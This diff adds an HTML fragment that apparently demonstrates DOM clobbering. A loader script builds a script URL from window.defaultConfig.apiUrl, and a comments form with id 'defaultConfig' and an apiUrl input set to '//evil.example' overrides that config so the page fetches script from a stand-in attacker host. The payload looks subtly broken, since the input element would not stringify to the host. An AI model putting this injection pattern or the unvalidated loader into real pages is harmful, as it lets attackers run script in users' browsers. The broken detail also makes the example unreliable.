@@ -1,0 +1,15 @@
+<script>
+  function loadWidget() {
+    var apiUrl = window.defaultConfig.apiUrl;
+    var script = document.createElement("script");
+    script.src = apiUrl + "/widget.js";
+    document.body.appendChild(script);
+  }
+  loadWidget();
+</script>
+
+<div id="comments">
+  <form id="defaultConfig"><input name="apiUrl" value="//evil.example"></form>
+</div>
+
+
